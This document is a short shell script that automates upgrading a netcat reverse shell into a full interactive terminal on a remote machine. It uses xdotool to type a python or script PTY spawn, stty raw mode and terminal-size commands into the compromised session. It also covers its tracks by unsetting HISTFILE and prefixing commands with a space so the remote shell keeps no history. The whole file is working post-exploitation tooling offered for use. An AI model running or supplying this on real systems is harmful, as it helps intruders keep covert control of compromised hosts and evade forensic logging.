#!/bin/sh
# Start this script with a shortcut inside your nc shell to upgrade its functionality to a full pty
# Commands that are typed on the remote system are prefixed with a space to prevent saving them to history
# Needs a sort of NOP slide because sometimes xdotool would only type after the forth or fifth character
sleep 3
xdotool type ' #################'
xdotool key Return
xdotool type ' unset HISTFILE'
xdotool key Return
xdotool type ' python -c '\''import pty; pty.spawn("/bin/bash")'\'' || python3 -c '\''import pty; pty.spawn("/bin/bash")'\'' || script -qc /bin/bash /dev/null'
xdotool key Return
xdotool keydown ctrl key z; sleep .1; xdotool keyup ctrl
xdotool type 'stty size | xclip -selection clipboard'
xdotool key Return
xdotool type 'stty raw -echo; fg'
xdotool key Return
xdotool type ' unset HISTFILE'
xdotool key Return
xdotool type ' export SHELL=bash'
xdotool key Return
xdotool type ' export TERM=xterm-256color'
xdotool key Return
xdotool type " stty cols $(xclip -o -selection clipboard | awk '{print $2}') rows $(xclip -o -selection clipboard | awk '{print $1}')"
xdotool key Return
xdotool type ' reset'
xdotool key Return
xdotool type ' exec /bin/bash'
xdotool key Return
xdotool type ' clear'
xdotool key Return
